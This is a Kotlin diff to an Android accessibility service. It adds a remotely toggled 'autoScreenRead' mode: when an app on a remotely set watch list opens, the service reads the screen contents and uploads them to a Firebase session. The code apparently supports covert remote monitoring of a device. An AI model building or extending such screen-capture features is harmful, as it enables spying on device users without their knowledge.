@@ -1,5 +1,6 @@
 package com.jonas.x24.services
 
+import kotlinx.coroutines.*
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
 import android.graphics.Path
@@ -20,6 +21,9 @@ class x24AccessibilityService : AccessibilityService() {
     }
 
     private var watchedApps: List<String> = listOf()
+    private var autoScreenRead: Boolean = false
+    private var hasReadScreenForApp = mutableSetOf<String>()
+
     private var sessionKey: String? = null
     private var isListeningToFirebase = false
 
@@ -36,17 +40,23 @@ class x24AccessibilityService : AccessibilityService() {
     private fun setupFirebaseListener() {
         if (sessionKey == null || isListeningToFirebase) return
         isListeningToFirebase = true
-        val stateRef = FirebaseDatabase.getInstance().getReference("sessions").child(sessionKey!!).child("state").child("watchedApps")
-        stateRef.addValueEventListener(object : ValueEventListener {
+        val stateRef = FirebaseDatabase.getInstance().getReference("sessions").child(sessionKey!!).child("state")
+
+        stateRef.child("watchedApps").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val list = mutableListOf<String>()
                 for (child in snapshot.children) {
                     val app = child.getValue(String::class.java)
-                    if (app != null) {
-                        list.add(app)
-                    }
+                    if (app != null) list.add(app)
                 }
                 watchedApps = list
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
+
+        stateRef.child("autoScreenRead").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                autoScreenRead = snapshot.getValue(Boolean::class.java) ?: false
             }
             override fun onCancelled(error: DatabaseError) {}
         })
@@ -71,7 +81,23 @@ class x24AccessibilityService : AccessibilityService() {
                         "timestamp" to currentTime
                     )
                     alertsRef.setValue(alertData)
+
+                    if (autoScreenRead && !hasReadScreenForApp.contains(packageName)) {
+                        hasReadScreenForApp.add(packageName)
+                        CoroutineScope(Dispatchers.IO).launch {
+                            delay(1500)
+                            val contextData = getScreenContext()
+                            val resultsRef = FirebaseDatabase.getInstance().getReference("sessions").child(sessionKey!!).child("results").push()
+                            resultsRef.setValue(mapOf(
+                                "type" to "READ_SCREEN",
+                                "data" to "Screen Context:\n$contextData",
+                                "timestamp" to System.currentTimeMillis()
+                            ))
+                        }
+                    }
                 }
+            } else if (packageName != null && !watchedApps.contains(packageName)) {
+                hasReadScreenForApp.remove(packageName)
             }
         }
     }
